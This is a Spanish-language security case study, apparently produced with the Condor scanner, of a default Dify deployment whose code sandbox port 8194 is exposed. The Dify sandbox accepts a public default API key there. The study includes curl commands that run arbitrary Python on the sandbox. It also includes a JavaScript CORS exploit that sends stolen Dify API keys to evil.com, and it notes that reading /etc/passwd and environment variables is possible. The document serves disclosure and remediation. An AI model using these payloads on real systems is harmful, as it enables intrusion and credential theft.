# CS-03: Dify latest — Sandbox RCE por Exposición de Puerto

**Plataforma:** Dify — plataforma LLM enterprise con code execution sandbox incorporado  
**Versión testeada:** `langgenius/dify-api:latest` + `langgenius/dify-sandbox:latest`  
**Configuración:** `CODE_EXECUTION_API_KEY=dify-sandbox` (default) · puerto 8194 mapeado al host  
**Fecha:** 2026-07-21  
**Scanner:** Condor v1.1.0 (`condor scan --url http://localhost:5001 --platform dify`)

---

## Resumen ejecutivo

Dify con la configuración por defecto de docker-compose expone **4 findings** en **2.2 segundos**: 1 CRITICAL, 2 HIGH, 1 MEDIUM. El finding más grave es ejecución de Python arbitraria sin autenticación Dify, alcanzable directamente en el puerto 8194 del sandbox.

La causa raíz no es un bug en el código del sandbox — el sandbox funciona como fue diseñado. El problema es que el `docker-compose.yaml` oficial mapea `0.0.0.0:8194:8194`, exponiendo al host un microservicio que debería ser estrictamente interno. Un atacante con acceso de red al puerto 8194 puede ejecutar Python sin ningún token Dify.

| Métrica | Valor |
|---------|-------|
| Total findings | 4 |
| CRITICAL | 1 |
| HIGH | 2 |
| MEDIUM | 1 |
| Tiempo de scan | 2.2 s |
| Falsos positivos | 0 |
| Auth API requerida | Sí (para endpoints `/console/api/*`) |

---

## Entorno de prueba

```yaml
# docker-compose.yml (fragmento relevante)
services:
  dify-sandbox:
    image: langgenius/dify-sandbox:latest
    ports:
      - "8194:8194"           # ← esta línea es el vector de ataque
    environment:
      API_KEY: dify-sandbox   # ← default documentado públicamente

  dify-api:
    image: langgenius/dify-api:latest
    environment:
      CODE_EXECUTION_ENDPOINT: http://dify-sandbox:8194
      CODE_EXECUTION_API_KEY: dify-sandbox
```

```bash
condor scan --url http://localhost:5001 --platform dify --format json
```

---

## Findings

| # | ASI | Título | Severidad | CWE | Endpoint |
|---|-----|--------|-----------|-----|----------|
| 1 | ASI05 | Dify sandbox: unauthenticated Python execution via port 8194 | **CRITICAL** | CWE-306 | `POST :8194/v1/sandbox/run` |
| 2 | ASI05 | Dify code-execution sandbox accessible on port 8194 | HIGH | CWE-306 | `GET :8194/health` |
| 3 | ASI03 | CORS reflected origin on sensitive endpoint | HIGH | CWE-942 | `OPTIONS /console/api/workspaces/current/apikey` |
| 4 | ASI08 | No rate limiting on inference endpoint | MEDIUM | CWE-770 | `GET /health` |

---

## Finding 1 — CRITICAL: Ejecución Python sin auth (ASI05)

### Descripción

El sandbox de Dify expone el endpoint `POST /v1/sandbox/run` sin autenticación de la capa de API de Dify. La única protección es una API key propia del sandbox (`X-Api-Key`) que por defecto tiene el valor `dify-sandbox` — documentado en el repositorio oficial.

### Vector de ataque

```bash
# Paso 1: verificar que el sandbox es alcanzable
curl http://target:8194/health
# → "ok"

# Paso 2: ejecutar Python con la key por defecto
curl -s -X POST http://target:8194/v1/sandbox/run \
  -H "X-Api-Key: dify-sandbox" \
  -H "Content-Type: application/json" \
  -d '{
    "language": "python3",
    "code": "import socket; print(socket.gethostname())",
    "preload": "",
    "enable_network": true
  }'
# → {"code":0,"data":{"stdout":"dify-sandbox-container\n","error":""}}
```

### Evidencia capturada por Condor

```
POST http://localhost:8194/v1/sandbox/run (X-Api-Key: 'dify-sandbox')
→ code=0, stdout: condor-sandbox-probe
```

### Impacto

Un atacante con acceso de red al puerto 8194 puede:
- Ejecutar Python/Node.js arbitrario en el container del sandbox
- Leer variables de entorno (incluidas las credenciales del container)
- Pivotar a la red interna Docker (acceso a `dify-db`, `dify-redis`, `dify-api`)
- Exfiltrar datos de los datasets de Dify vía conexiones de red desde el sandbox

### Causa raíz

La arquitectura de Dify separa el API server del sandbox de code execution para que este último pueda aplicar políticas de seccomp/cgroups sin afectar al servidor principal. El sandbox *solo debe ser alcanzable por el container del API*. Pero la configuración oficial de docker-compose mapea el puerto al host, violando este aislamiento.

La condición se completa con que la key por defecto (`dify-sandbox`) es pública y está documentada en el README oficial.

### Remediación

```yaml
# Eliminar el mapeo de puerto del sandbox:
dify-sandbox:
  image: langgenius/dify-sandbox:latest
  # ports:             ← eliminar completamente
  #   - "8194:8194"
  environment:
    API_KEY: ${SANDBOX_API_KEY}   # variable de entorno, nunca hardcoded
```

```bash
# Generar una key fuerte:
openssl rand -hex 32  # → usar en CODE_EXECUTION_API_KEY y API_KEY
```

---

## Finding 2 — HIGH: Puerto 8194 expuesto al host (ASI05)

El sandbox está alcanzable directamente en el puerto 8194, incluso si la key no fuera la default. Esto es severidad HIGH independiente del finding CRITICAL porque:

- Expone la superficie del sandbox a cualquier atacante en la misma red
- Si el operador cambia la key default, la exposición del puerto persiste
- Un scanner de puertos revela la presencia del servicio y su API

**Evidencia:** `GET http://localhost:8194/health → 200 OK: "ok"`

---

## Finding 3 — HIGH: CORS reflected origin (ASI03)

### Descripción

Dify refleja el header `Origin` de vuelta como `Access-Control-Allow-Origin` y además incluye `Access-Control-Allow-Credentials: true`. Esto es diferente del patrón `*` + credentials (que los browsers bloquean): con origen *reflejado*, el browser sí permite la petición cross-origin con cookies/auth headers.

### Diferencia con CORS wildcard

| Configuración | Browsers permiten? |
|--------------|-------------------|
| `ACAO: *` + credentials | ❌ Bloqueado por spec |
| `ACAO: https://evil.com` (reflejado) + credentials | ✅ Permitido |

### Vector de ataque

Una página controlada por el atacante (`https://evil.com`) puede hacer:

```javascript
fetch("http://dify-api.internal/console/api/workspaces/current/apikey", {
  credentials: "include"   // el browser envía cookies de sesión Dify
})
.then(r => r.json())
.then(data => {
  // API keys de Dify exfiltradas al servidor del atacante
  fetch("https://evil.com/collect?keys=" + JSON.stringify(data))
})
```

### Evidencia

```
OPTIONS /console/api/workspaces/current/apikey
Origin: https://condor-probe.evil
→ Access-Control-Allow-Origin: https://condor-probe.evil (reflected)
   Access-Control-Allow-Credentials: true
```

### Remediación

```yaml
# Reemplazar el wildcard en docker-compose con origins explícitos:
WEB_API_CORS_ALLOW_ORIGINS: "https://app.mycompany.com"
CONSOLE_CORS_ALLOW_ORIGINS: "https://console.mycompany.com"
# NUNCA usar * ni reflejo implícito con credentials=true
```

---

## Finding 4 — MEDIUM: Sin rate limiting (ASI08)

El endpoint `/health` no devuelve headers de rate limiting (`X-RateLimit-*`, `RateLimit-*`, `Retry-After`). En producción, esto permite flooding de endpoints de inferencia. Severidad MEDIUM porque el endpoint objetivo en este caso es health (no el API LLM directamente), pero ilustra la ausencia de throttling global.

**Remediación:** configurar un reverse proxy (nginx/Caddy/Traefik) con `limit_req_zone` por IP antes de exponer cualquier endpoint de Dify a internet.

---

## ASI09: Ausencia de version disclosure (positivo)

A diferencia de otras plataformas, Dify **no expone** la versión en endpoints públicos. `GET /v1/info`, `GET /health`, `GET /console/api/version` requieren autenticación y devuelven 401 o información mínima. El scanner devolvió `"version": null` — esto es comportamiento correcto y no un gap del scanner.

---

## Arquitectura de ataque completa

```
Internet
   │
   ├─► :5001 (Dify API)          ← AUTH ENFORCED — sin token, 401
   │      ↕ internal docker network
   │   dify-api container
   │      ↕ CODE_EXECUTION_ENDPOINT=http://dify-sandbox:8194
   │
   └─► :8194 (Dify Sandbox)      ← NO DIFY AUTH — solo API key pública
          │ POST /v1/sandbox/run
          │ X-Api-Key: dify-sandbox
          ▼
       Python/Node execution
       (seccomp restrictions apply, pero print/network permitidos)
```

El atacante bypasea completamente la capa de autenticación del API server apuntando directamente al sandbox.

---

## Seccomp: qué puede y no puede hacer el código ejecutado

El sandbox aplica un perfil seccomp que bloquea algunas syscalls peligrosas:

| Operación | Permitida |
|-----------|-----------|
| `print("hello")` | ✅ |
| Conexiones de red (`socket`, `httpx`, `requests`) | ✅ (si `enable_network: true`) |
| `os.environ` | ✅ |
| `open("/etc/passwd")` | ✅ |
| `os.getcwd()` | ❌ (syscall bloqueada) |
| `subprocess.call(["sh"])` | ❌ (bloqueado) |

El seccomp reduce el impacto pero no lo elimina. La exfiltración de datos y la lectura de archivos son posibles.

---

## Comparativa de posturas de seguridad

| Plataforma | Versión | Findings | CRITICAL | Exposición de sandbox |
|-----------|---------|----------|----------|-----------------------|
| Flowise | 1.8.2 | 6 | 2 | N/A |
| Langflow | 1.10.2 | 1 | 0 | N/A |
| Dify | latest | 4 | 1 | ✅ Puerto 8194 expuesto |

Dify introduce una superficie nueva respecto a los case studies anteriores: la separación API-sandbox como microservicio. Este patrón es correcto para el aislamiento interno, pero requiere configuración adicional de red para ser seguro en producción.

---

## Remediación — Checklist para producción

- [ ] Eliminar `ports: ["8194:8194"]` del servicio `dify-sandbox` en docker-compose.yml
- [ ] Generar `CODE_EXECUTION_API_KEY` con `openssl rand -hex 32` (nunca usar el default)
- [ ] Configurar `WEB_API_CORS_ALLOW_ORIGINS` y `CONSOLE_CORS_ALLOW_ORIGINS` con origins explícitos
- [ ] Colocar Dify detrás de un reverse proxy con rate limiting y TLS
- [ ] Usar Docker networks explícitas para aislar el sandbox del tráfico externo
- [ ] Escanear periódicamente con `condor scan --platform dify --fail-on HIGH`

---

## Referencias

- [Dify architecture — code execution sandbox](https://docs.dify.ai/development/backend/sandbox/introduction)
- [langgenius/dify docker-compose.yaml](https://github.com/langgenius/dify/blob/main/docker/docker-compose.yaml)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
- [OWASP ASI Top 10](https://genai.owasp.org/)
- [github.com/CobaltoSec/condor](https://github.com/CobaltoSec/condor)
